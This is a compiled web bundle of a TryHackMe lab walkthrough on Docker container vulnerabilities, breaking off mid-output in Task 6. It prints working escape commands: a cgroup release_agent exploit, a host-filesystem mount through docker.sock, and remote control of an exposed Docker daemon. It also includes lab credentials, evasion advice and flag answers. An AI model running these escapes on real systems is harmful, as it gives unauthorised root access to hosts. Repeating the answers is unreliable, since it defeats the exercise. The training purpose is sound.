"use strict";(self.webpackChunktryhackme_cn=self.webpackChunktryhackme_cn||[]).push([[800],{7284:(e,n,t)=>{t.d(n,{A:()=>i});const i=t.p+"assets/images/image_20251122-192221-75d997850a0db739277c7cf809a88e6c.png"},7603:(e,n,t)=>{t.d(n,{A:()=>i});const i=t.p+"assets/images/image_20251128-192822-623610a5d26526f2730d762d36089016.png"},8412:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>d,frontMatter:()=>r,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"Modules/Container Security/Container Vulnerabilities","title":"Container Vulnerabilities","description":"Task 1 Introduction (Deploy)","source":"@site/i18n/zh/docusaurus-plugin-content-docs/current/Modules/Container Security/Container Vulnerabilities.md","sourceDirName":"Modules/Container Security","slug":"/Modules/Container Security/Container Vulnerabilities","permalink":"/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Container Security/Container Vulnerabilities.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"sidebar_position":4},"sidebar":"tutorialSidebar","previous":{"title":"Intro to Kubernetes","permalink":"/TryHackMe-CN/docs/Modules/Container Security/Intro to Kubernetes"},"next":{"title":"Container Hardening","permalink":"/TryHackMe-CN/docs/Modules/Container Security/Container Hardening"}}');var s=t(4848),o=t(8453);const r={sidebar_position:4},a="Container Vulnerabilities",c={},l=[{value:"Task 1 Introduction (Deploy)",id:"task-1-introduction-deploy",level:2},{value:"Learning Objectives",id:"learning-objectives",level:3},{value:"Prerequisites",id:"prerequisites",level:3},{value:"Important Context",id:"important-context",level:3},{value:"Deploy the Vulnerable Machine for This Room",id:"deploy-the-vulnerable-machine-for-this-room",level:3},{value:"Task 2 Container Vulnerabilities 101",id:"task-2-container-vulnerabilities-101",level:2},{value:"What Sort of Vulnerabilities Can We Expect To Find in Docker Containers",id:"what-sort-of-vulnerabilities-can-we-expect-to-find-in-docker-containers",level:3},{value:"Task 3 Vulnerability 1: Privileged Containers (Capabilities)",id:"task-3-vulnerability-1-privileged-containers-capabilities",level:2},{value:"Understanding Capabilities",id:"understanding-capabilities",level:3},{value:"What Does This Mean for Us",id:"what-does-this-mean-for-us",level:3},{value:"Explaining the Vulnerability",id:"explaining-the-vulnerability",level:3},{value:"Task 4 Vulnerability 2: Escaping via Exposed Docker Daemon",id:"task-4-vulnerability-2-escaping-via-exposed-docker-daemon",level:2},{value:"Unix Sockets 101 (One Size Fits All)",id:"unix-sockets-101-one-size-fits-all",level:3},{value:"How Does Docker Use Sockets",id:"how-does-docker-use-sockets",level:3},{value:"Finding the Docker Socket in a Container",id:"finding-the-docker-socket-in-a-container",level:3},{value:"Exploiting the Docker Socket in a Container",id:"exploiting-the-docker-socket-in-a-container",level:3},{value:"Verify Success",id:"verify-success",level:3},{value:"Task 5 Vulnerability 3: Remote Code Execution via Exposed Docker Daemon",id:"task-5-vulnerability-3-remote-code-execution-via-exposed-docker-daemon",level:2},{value:"The Docker Engine - TCP Sockets Edition",id:"the-docker-engine---tcp-sockets-edition",level:3},{value:"The Vulnerability",id:"the-vulnerability",level:3},{value:"Enumerating: Finding Out if a Device Has Docker Remotely Accessible",id:"enumerating-finding-out-if-a-device-has-docker-remotely-accessible",level:3},{value:"Executing Docker Commands on Our Target",id:"executing-docker-commands-on-our-target",level:3},{value:"What Now",id:"what-now",level:3},{value:"Task 6 Vulnerability 4: Abusing Namespaces",id:"task-6-vulnerability-4-abusing-namespaces",level:2},{value:"What Are Namespaces",id:"what-are-namespaces",level:3},{value:"Determining if We&#39;re in a Container (Processes)",id:"determining-if-were-in-a-container-processes",level:3},{value:"How Can We Abuse Namespaces",id:"how-can-we-abuse-namespaces",level:3},{value:"The Exploit",id:"the-exploit",level:3},{value:"Task 7 Conclusion",id:"task-7-conclusion",level:2}];function h(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,o.R)(),...e.components},{Details:i}=n;return i||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"container-vulnerabilities",children:"Container Vulnerabilities"})}),"\n",(0,s.jsx)(n.h2,{id:"task-1-introduction-deploy",children:"Task 1 Introduction (Deploy)"}),"\n",(0,s.jsx)(n.p,{children:"This room will demonstrate some of the common vulnerabilities found in Docker containers and how an attacker can abuse these to escape."}),"\n",(0,s.jsx)(n.h3,{id:"learning-objectives",children:"Learning Objectives"}),"\n",(0,s.jsx)(n.p,{children:"In this room, you will learn the following:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Some of the vulnerabilities that can exist in a Docker container."}),"\n",(0,s.jsx)(n.li,{children:"What you, as an attacker, can gain from exploiting these vulnerabilities."}),"\n",(0,s.jsx)(n.li,{children:"Why these vulnerabilities exist (i.e. misconfiguration)."}),"\n",(0,s.jsx)(n.li,{children:"How to search for vulnerabilities within a Docker container."}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"prerequisites",children:"Prerequisites"}),"\n",(0,s.jsx)(n.p,{children:"Before proceeding, it is strongly recommended that you have completed the Intro to Docker room and are comfortable with the Linux CLI."}),"\n",(0,s.jsx)(n.h3,{id:"important-context",children:"Important Context"}),"\n",(0,s.jsx)(n.p,{children:"This room focuses on exploiting the Docker daemon itself, which often, relies on having elevated permissions within the container. In other words, this room assumes that you have already managed to become root in the container."}),"\n",(0,s.jsx)(n.h3,{id:"deploy-the-vulnerable-machine-for-this-room",children:"Deploy the Vulnerable Machine for This Room"}),"\n",(0,s.jsx)(n.p,{children:'Press the green "Start Machine" button located at the top-right of this task. You can access the machine using the credentials below, via the TryHackMe AttackBox or by connecting your machine to the TryHackMe Network. You will be using this machine to answer the questions throughout the tasks in this room.'}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{style:{textAlign:"center"},children:"Key"}),(0,s.jsx)(n.th,{style:{textAlign:"center"},children:"Value"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"Username"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"root"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"Password"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"tryhackme123!"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"IP"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"MACHINE_IP"})]})]})]}),"\n",(0,s.jsx)(n.admonition,{title:"Answer the questions below",type:"info",children:(0,s.jsxs)(i,{children:[(0,s.jsx)("summary",{children:" Complete me to progress with this room! "}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})}),"\n",(0,s.jsx)(n.h2,{id:"task-2-container-vulnerabilities-101",children:"Task 2 Container Vulnerabilities 101"}),"\n",(0,s.jsxs)(n.p,{children:["Before we begin, it's important to re-cap some of the things learned in the ",(0,s.jsx)(n.a,{href:"https://tryhackme.com/room/introtocontainerisation",children:"Intro to Containerisation"})," room. First, let's recall that containers are isolated and have minimal environments. The picture below depicts the environment of a container."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"Illustrating three containers on a single computer",src:t(7284).A+"",width:"1198",height:"960"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Some important things to note are:"})}),"\n",(0,s.jsx)(n.p,{children:"Just because you have access (i.e. a foothold) to a container, it does not mean you have access to the host operating system and associated files or other containers."}),"\n",(0,s.jsx)(n.p,{children:"Due to the minimal nature of containers (i.e. they only have the tools specified by the developer), you are unlikely to find fundamental tools such as Netcat, Wget or even Bash! This makes interacting within a container quite difficult for an attacker."}),"\n",(0,s.jsx)(n.h3,{id:"what-sort-of-vulnerabilities-can-we-expect-to-find-in-docker-containers",children:"What Sort of Vulnerabilities Can We Expect To Find in Docker Containers"}),"\n",(0,s.jsx)(n.p,{children:"While Docker containers are designed to isolate applications from one another, they can still be vulnerable. For example, hard-coded passwords for an application can still be present. If an attacker is able to gain access through a vulnerable web application, for example, they will be able to find these credentials. You can see an example of a web application containing hard-coded credentials to a database server in the code snippet below:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"/** Database hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database name */\ndefine( 'DB_NAME', 'sales' );\n\n/** Database username */\ndefine( 'DB_USER', 'production' );\n\n/** Database password */\ndefine( 'DB_PASSWORD', 'SuperstrongPassword321!' );\n"})}),"\n",(0,s.jsx)(n.p,{children:"This, of course, isn't the only vulnerability that can be exploited in containers. The other potential attack vectors have been listed in the table below."}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{style:{textAlign:"left"},children:"Vulnerability"}),(0,s.jsx)(n.th,{style:{textAlign:"left"},children:"Description"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"Misconfigured Containers"}),(0,s.jsx)(n.td,{style:{textAlign:"left"},children:'Misconfigured containers will have privileges that are not necessary for the operation of the container. For example, a container running in "privileged" mode will have access to the host operating system - removing the layers of isolation.'})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"Vulnerable Images"}),(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"There have been numerous incidents of popular Docker images being backdoored to perform malicious actions such as crypto mining."})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"Network Connectivity"}),(0,s.jsxs)(n.td,{style:{textAlign:"left"},children:["A container that is not correctly networked can be exposed to the internet. For example, a database container for a web application should only be accessible to the web application container - not the internet.",(0,s.jsx)("br",{}),"Additionally, containers can serve to become a method of lateral movement. Once an attacker has access to a container, they may be able to interact with other containers on the host that are not exposed to the network."]})]})]})]}),"\n",(0,s.jsx)(n.p,{children:"This is just a brief summary of some of the types of vulnerabilities that can exist within a container. The tasks in this room will delve into these further!"}),"\n",(0,s.jsx)(n.admonition,{title:"Answer the questions below",type:"info",children:(0,s.jsxs)(i,{children:[(0,s.jsx)("summary",{children:" Click to proceed to the next task! "}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})}),"\n",(0,s.jsx)(n.h2,{id:"task-3-vulnerability-1-privileged-containers-capabilities",children:"Task 3 Vulnerability 1: Privileged Containers (Capabilities)"}),"\n",(0,s.jsx)(n.h3,{id:"understanding-capabilities",children:"Understanding Capabilities"}),"\n",(0,s.jsx)(n.p,{children:"At its fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all."}),"\n",(0,s.jsx)(n.p,{children:"These capabilities determine what permissions a Docker container has to the operating system. Docker containers can run in two modes:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"User (Normal) mode"}),"\n",(0,s.jsx)(n.li,{children:"Privileged mode"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"In the diagram below, we can see the two different modes in action and the level of access each mode has to the host:"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"Illustrating the different container modes and privileges and the level of access they have to the operating system.",src:t(7603).A+"",width:"1198",height:"960"})}),"\n",(0,s.jsx)(n.p,{children:'Note how containers #1 and #2 are running in "user/normal" mode, whereas container #3 is running in "privileged" mode. Containers in "user" mode interact with the operating system through the Docker Engine. Privileged containers, however, do not do this. Instead, they bypass the Docker Engine and directly communicate with the operating system.'}),"\n",(0,s.jsx)(n.h3,{id:"what-does-this-mean-for-us",children:"What Does This Mean for Us"}),"\n",(0,s.jsx)(n.p,{children:"Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root on the host."}),"\n",(0,s.jsxs)(n.p,{children:["We can use a utility such as ",(0,s.jsx)(n.code,{children:"capsh"})," which comes with the libcap2-bin package to list the capabilities our container has: ",(0,s.jsx)(n.code,{children:"capsh --print"})," . Capabilities are used in Linux to assign specific permissions to a process. Listing the capabilities of the container is a good way to determine the syscalls that can be made and potential mechanisms for exploitation."]}),"\n",(0,s.jsx)(n.p,{children:"Some capabilities of interest have been provided in the terminal snippet below."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Listing capabilities of a privileged Docker Container"',children:"cmnatic@privilegedcontainer:~$ capsh --print \nCurrent: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid\n"})}),"\n",(0,s.jsx)(n.p,{children:"In the example exploit below, we are going to use the mount syscall (as allowed by the container's capabilities) to mount the host's control groups into the container."}),"\n",(0,s.jsxs)(n.p,{children:["The code snippet below is based upon (but a modified) version of the ",(0,s.jsx)(n.a,{href:"https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.",children:"Proof of Concept (PoC) created by Trailofbits"}),", which details the inner workings of this exploit well."]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\n2. echo 1 > /tmp/cgrp/x/notify_on_release\n3. host_path=`sed -n \'s/.*\\perdir=\\([^,]*\\).*/\\1/p\' /etc/mtab`\n4. echo "$host_path/exploit" > /tmp/cgrp/release_agent\n5. echo \'#!/bin/sh\' > /exploit\n6. echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit\n7. chmod a+x /exploit\n8. sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"\n'})}),"\n",(0,s.jsx)(n.p,{children:"Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine."}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h3,{id:"explaining-the-vulnerability",children:"Explaining the Vulnerability"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:'We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system. Since we can manage "cgroups" as root on the host, we\'ll mount this to "/tmp/cgrp" on the container.'}),"\n",(0,s.jsxs)(n.li,{children:['For our exploit to execute, we\'ll need to tell the kernel to run our code. By adding "1" to "/tmp/cgrp/x/notify_on_release", we\'re telling the kernel to execute something once the "cgroup" finishes. (',(0,s.jsx)(n.a,{href:"https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt",children:"Paul Menage., 2004"}),")."]}),"\n",(0,s.jsx)(n.li,{children:"We find out where the container's files are stored on the host and store it as a variable."}),"\n",(0,s.jsx)(n.li,{children:'We then echo the location of the container\'s files into our "/exploit" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released.'}),"\n",(0,s.jsx)(n.li,{children:"Let's turn our exploit into a shell on the host"}),"\n",(0,s.jsx)(n.li,{children:'Execute a command to echo the host flag into a file named "flag.txt" in the container once "/exploit" is executed.'}),"\n",(0,s.jsx)(n.li,{children:"Make our exploit executable!"}),"\n",(0,s.jsx)(n.li,{children:'We create a process and store that into "/tmp/cgrp/x/cgroup.procs". When the processs is released, the contents will be executed.'}),"\n"]}),"\n",(0,s.jsx)(n.admonition,{title:"Answer the questions below",type:"info",children:(0,s.jsxs)(i,{children:[(0,s.jsxs)("summary",{children:[" Perform the exploit in this task on the target machine. ",(0,s.jsx)(n.strong,{children:"What is the value of the flag that has now been added to the container?"})," "]}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"THM{MOUNT_MADNESS}\n"})})]})}),"\n",(0,s.jsx)(n.h2,{id:"task-4-vulnerability-2-escaping-via-exposed-docker-daemon",children:"Task 4 Vulnerability 2: Escaping via Exposed Docker Daemon"}),"\n",(0,s.jsx)(n.h3,{id:"unix-sockets-101-one-size-fits-all",children:"Unix Sockets 101 (One Size Fits All)"}),"\n",(0,s.jsx)(n.p,{children:'When mentioning "sockets", you would likely think of "sockets" in networking. Well, the concept here is almost the same. Sockets are used to move data between two places. Unix sockets use the filesystem to transfer data rather than networking interfaces. This is known as Inter-process Communication (IPC) and is essential in operating systems because being able to send data between processes is extremely important.'}),"\n",(0,s.jsxs)(n.p,{children:["Unix sockets are substantially quicker at transferring data than TCP/IP sockets (",(0,s.jsx)(n.a,{href:"https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/",children:"Percona., 2020"}),"). This is why database technologies such as ",(0,s.jsx)(n.a,{href:"https://redis.io/",children:"Redis"})," boast such outstanding performance. Unix sockets also use file system permissions. This is important to remember for the next heading."]}),"\n",(0,s.jsx)(n.h3,{id:"how-does-docker-use-sockets",children:"How Does Docker Use Sockets"}),"\n",(0,s.jsxs)(n.p,{children:["When interacting with the Docker Engine (i.e. running commands such as ",(0,s.jsx)(n.code,{children:"docker run"}),"), this will be done using a socket (usually, this is done using a Unix socket unless you execute the commands to a remote Docker host). Recall that Unix sockets use filesystem permissions. This is why you must be a member of the Docker group (or root!) to run Docker commands, as you will need the permissions to access the socket owned by Docker."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Verifying that our user is a part of the Docker group"',children:"cmnatic@demo-container:~$ groups\ncmnatic sudo docker\n"})}),"\n",(0,s.jsx)(n.h3,{id:"finding-the-docker-socket-in-a-container",children:"Finding the Docker Socket in a Container"}),"\n",(0,s.jsxs)(n.p,{children:["Remember, containers interact with the host operating system using the Docker Engine (and, therefore, have access to the Docker socket!) This socket (named docker.sock) will be mounted in the container. The location of this varies by the operating system the container is running, so you would want to ",(0,s.jsx)(n.code,{children:"find"})," it. However, in this example, the container runs Ubuntu 18.04, meaning the docker.sock is located in ",(0,s.jsx)(n.code,{children:"/var/run"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Note"}),": This location can vary based on the operating system and can even be manually set by the developer at runtime of the container."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Finding the docker.sock file in a container"',children:"cmnatic@demo-container:~$ ls -la /var/run | grep sock\nsrw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock\n"})}),"\n",(0,s.jsx)(n.h3,{id:"exploiting-the-docker-socket-in-a-container",children:"Exploiting the Docker Socket in a Container"}),"\n",(0,s.jsx)(n.p,{children:'First, let\'s confirm we can execute docker commands. You will either need to be root on the container or have the "docker" group permissions as a lower-privileged user.'}),"\n",(0,s.jsx)(n.p,{children:"Let's break down the vulnerability here:"}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.p,{children:"We will use Docker to create a new container and mount the host's filesystem into this new container. Then we are going to access the new container and look at the host's filesystem."}),"\n",(0,s.jsxs)(n.p,{children:["Our final command will look like this: ",(0,s.jsx)(n.code,{children:"docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}),", which does the following:"]}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:'We will need to upload a docker image. For this room, I have provided this on the VM. It is called "alpine". The "alpine" distribution is not a necessity, but it is extremely lightweight and will blend in a lot better. To avoid detection, it is best to use an image that is already present in the system, otherwise, you will have to upload this yourself.'}),"\n",(0,s.jsxs)(n.li,{children:["We will use ",(0,s.jsx)(n.code,{children:"docker run"})," to start the new container and mount the host's file system (/) to (/mnt) in the new container: ",(0,s.jsx)(n.code,{children:"docker run -v /:/mnt"})]}),"\n",(0,s.jsxs)(n.li,{children:["We will tell the container to run interactively (so that we can execute commands in the new container): ",(0,s.jsx)(n.code,{children:"-it"})]}),"\n",(0,s.jsxs)(n.li,{children:["Now, we will use the already provided alpine image: ",(0,s.jsx)(n.code,{children:"alpine"})]}),"\n",(0,s.jsxs)(n.li,{children:["We will use ",(0,s.jsx)(n.code,{children:"chroot"})," to change the root directory of the container to be /mnt (where we are mounting the files from the host operating system): ",(0,s.jsx)(n.code,{children:"chroot /mnt"})]}),"\n",(0,s.jsxs)(n.li,{children:["Now, we will tell the container to run ",(0,s.jsx)(n.code,{children:"sh"})," to gain a shell and execute commands in the container: ",(0,s.jsx)(n.code,{children:"sh"})]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:'You may need to "Ctrl + C" to cancel the exploit once or twice for this vulnerability to work, but, as you can see below, we have successfully mounted the host operating system\'s filesystem into the new alpine container.'}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h3,{id:"verify-success",children:"Verify Success"}),"\n",(0,s.jsxs)(n.p,{children:["After executing the command, we should see that we have been placed into a new container. Remember, we mounted the host's filesystem to /mnt (and then used ",(0,s.jsx)(n.code,{children:"chroot"})," to make the container's /mnt become /)"]}),"\n",(0,s.jsxs)(n.p,{children:["So, let's see the contents of /  by doing ",(0,s.jsx)(n.code,{children:"ls /"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Listing the contents of / on the new container (which will have the host operating system\'s files)"',children:"root@alpine-container:~# ls /\nbin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr\nboot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swapfile  tmp  var\n"})}),"\n",(0,s.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,s.jsxs)(i,{children:[(0,s.jsx)("summary",{children:" Name the directory path which contains the docker.sock file on the container. "}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"/var/run\n"})})]}),(0,s.jsxs)(i,{children:[(0,s.jsxs)("summary",{children:[" Perform the exploit in this task on the target machine. ",(0,s.jsx)(n.strong,{children:"What is the value of the flag located at /root/flag.txt on the host operating system?"})," "]}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"THM{NEVER-ENOUGH-SOCKS}\n"})})]})]}),"\n",(0,s.jsx)(n.h2,{id:"task-5-vulnerability-3-remote-code-execution-via-exposed-docker-daemon",children:"Task 5 Vulnerability 3: Remote Code Execution via Exposed Docker Daemon"}),"\n",(0,s.jsx)(n.h3,{id:"the-docker-engine---tcp-sockets-edition",children:"The Docker Engine - TCP Sockets Edition"}),"\n",(0,s.jsx)(n.p,{children:"Recall how Docker uses sockets to communicate between the host operating system and containers in the previous task. Docker can also use TCP sockets to achieve this."}),"\n",(0,s.jsxs)(n.p,{children:["Docker can be remotely administrated. For example, using management tools such as ",(0,s.jsx)(n.a,{href:"https://www.portainer.io/",children:"Portainer"})," or ",(0,s.jsx)(n.a,{href:"https://www.jenkins.io/",children:"Jenkins"})," to deploy containers to test their code (yay, automation!)."]}),"\n",(0,s.jsx)(n.h3,{id:"the-vulnerability",children:"The Vulnerability"}),"\n",(0,s.jsx)(n.p,{children:"The Docker Engine will listen on a port when configured to be run remotely. The Docker Engine is easy to make remotely accessible but difficult to do securely. The vulnerability here is Docker is remotely accessible and allows anyone to execute commands. First, we will need to enumerate."}),"\n",(0,s.jsx)(n.h3,{id:"enumerating-finding-out-if-a-device-has-docker-remotely-accessible",children:"Enumerating: Finding Out if a Device Has Docker Remotely Accessible"}),"\n",(0,s.jsxs)(n.p,{children:["By default, the engine will run on ",(0,s.jsx)(n.strong,{children:"port 2375"}),". We can confirm this by performing an Nmap scan against your target (10.80.133.1) from your AttackBox."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Verifying if our target has Docker remotely accessible"',children:"cmnatic@attack-machine:~$ nmap -sV -p 2375 10.80.133.1 Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-02 21:27 GMT\nNmap scan report for docker-host (10.80.133.1)\nHost is up (0.0018s latency).\nNot shown: 65531 closed ports\nPORT    STATE SERVICE VERSION\n2375/tcp open docker Docker 20.10.20 (API 1.41)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Looks like it's open; we're going to use the ",(0,s.jsx)(n.code,{children:"curl"})," command to start interacting with the exposed Docker daemon. Confirming that we can access the Docker daemon: curl ",(0,s.jsx)(n.code,{children:"http://MACHINE_IP:2375/version"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="CURLing the Docker Socket"',children:'cmnatic@attack-machine:~$ curl http://10.80.133.1:2375/version\n{\n  "Platform": {\n    "Name": "Docker Engine - Community"\n  },\n  "Components": [\n    {\n      "Name": "Engine",\n      "Version": "20.10.20",\n      "Details": {\n        "ApiVersion": "1.41",\n        "Arch": "amd64",\n        "BuildTime": "2022-10-18T18:18:12.000000000+00:00",\n        "Experimental": "false",\n        "GitCommit": "03df974",\n        "GoVersion": "go1.18.7",\n        "KernelVersion": "5.15.0-1022-aws",\n        "MinAPIVersion": "1.12",\n        "Os": "linux"\n      }]\n}\n'})}),"\n",(0,s.jsx)(n.h3,{id:"executing-docker-commands-on-our-target",children:"Executing Docker Commands on Our Target"}),"\n",(0,s.jsxs)(n.p,{children:["For this, we'll need to tell our version of Docker to send the command to our target (not our own machine). We can add the \"-H\" switch to our target. To test if we can run commands, we'll list the containers on the target: ",(0,s.jsx)(n.code,{children:"docker -H tcp://10.80.133.1:2375 ps"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Listing the containers on our target"',children:'cmnatic@attack-machine:~$ docker -H tcp://10.80.133.1:2375 ps\nCONTAINER ID   IMAGE        COMMAND               CREATED        STATUS         PORTS                               NAMES\nb4ec8c45414c   dockertest   "/usr/sbin/sshd -D"   10 hours ago   Up 7 minutes   0.0.0.0:22->22/tcp, :::22->22/tcp   priceless_mirzakhani\n'})}),"\n",(0,s.jsx)(n.h3,{id:"what-now",children:"What Now"}),"\n",(0,s.jsxs)(n.p,{children:["Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further. It is worth recalling the commands covered in ",(0,s.jsx)(n.a,{href:"https://tryhackme.com/room/introtodockerk8pdqk",children:"Intro to Docker"}),". However, I've included some commands that you may wish to explore:"]}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{style:{textAlign:"left"},children:"Command"}),(0,s.jsx)(n.th,{style:{textAlign:"left"},children:"Description"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"images"}),(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"List images used by containers; data can also be exfiltrated by reverse-engineering the image."})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"exec"}),(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"Execute a command on a container."})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"run"}),(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"Run a container."})]})]})]}),"\n",(0,s.jsx)(n.admonition,{title:"Answer the questions below",type:"info",children:(0,s.jsxs)(i,{children:[(0,s.jsx)("summary",{children:" What port number, by default, does the Docker Engine use? "}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"2375\n"})})]})}),"\n",(0,s.jsx)(n.h2,{id:"task-6-vulnerability-4-abusing-namespaces",children:"Task 6 Vulnerability 4: Abusing Namespaces"}),"\n",(0,s.jsx)(n.h3,{id:"what-are-namespaces",children:"What Are Namespaces"}),"\n",(0,s.jsx)(n.p,{children:"Namespaces segregate system resources such as processes, files, and memory away from other namespaces. Every process running on Linux will be assigned two things:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"A namespace"}),"\n",(0,s.jsx)(n.li,{children:"A Process Identifier (PID)"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:'Namespaces are how containerisation is achieved! Processes can only "see" the process in the same namespace. Take Docker, for example, every new container will run as a new namespace, although the container may run multiple applications (processes).\nLet\'s prove the concept of containerisation by comparing the number of processes on the host operating system, in comparison to the Docker container that the host is running (an apache2 web server):'}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Listing running processes on a "normal" Ubuntu system"',children:"cmnatic@thm-dev:~$ ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n--cut for brevity--\ncmnatic     1984  0.0  0.7 493400 28932 ?        Sl   00:48   0:00 update-notifier\ncmnatic     2263  5.6 10.0 3385096 396960 ?      Sl   00:48   0:08 /snap/firefox/1232/usr/lib/firefox/firefox\ncmnatic     2429  0.4  2.8 2447088 114900 ?  